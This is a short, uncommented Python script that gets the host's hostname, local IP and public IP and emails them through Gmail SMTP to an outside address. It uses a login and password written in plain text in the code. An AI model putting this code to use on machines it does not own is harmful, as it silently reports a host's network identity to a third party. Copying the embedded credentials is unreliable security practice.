import socket
from smtplib import SMTP_SSL
from ssl import create_default_context
from requests import get

hostname = socket.gethostname()
print(hostname)
local_ip = socket.gethostbyname(hostname)
public_ip = get('https://api.ipify.org').text

port = 465
context = create_default_context()
with SMTP_SSL("smtp.gmail.com", port, context=context) as server:
    server.login("9.qk.c.2xmpu@gmail.com", "9.qk.c.2xmpu123")
    server.sendmail("9.qk.c.2xmpu@gmail.com", "jamescaroe@gmail.com", public_ip)
    server.sendmail("9.qk.c.2xmpu@gmail.com", "jamescaroe@gmail.com", local_ip)

